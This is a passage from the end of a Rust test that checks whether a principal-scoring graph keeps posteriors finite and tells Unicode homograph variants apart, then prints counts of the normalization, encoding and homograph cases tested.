                    assert!(posterior.posterior.is_finite(),
                        "Homograph variant '{}' should produce finite posterior", variant.escape_debug());
                }
            }
        }

        // Verify all homograph variants are treated as distinct
        let unique_principals: std::collections::HashSet<String> = graph.posteriors()
            .iter()
            .filter(|p| p.principal_id.starts_with("homograph_principal_"))
            .map(|p| p.principal_id.clone())
            .collect();

        let total_homograph_variants: usize = homograph_sets.iter().map(|set| set.len()).sum();
        assert!(unique_principals.len() >= total_homograph_variants - 5, // Allow some tolerance
            "Should distinguish most homograph variants: {} >= {}", unique_principals.len(), total_homograph_variants - 5);

        println!("Unicode attack resistance test completed: {} normalization attacks, {} encoding tests, {} homograph variants",
            unicode_normalization_attacks.len(), encoding_bypass_attacks.len(), total_homograph_variants);
    }
}
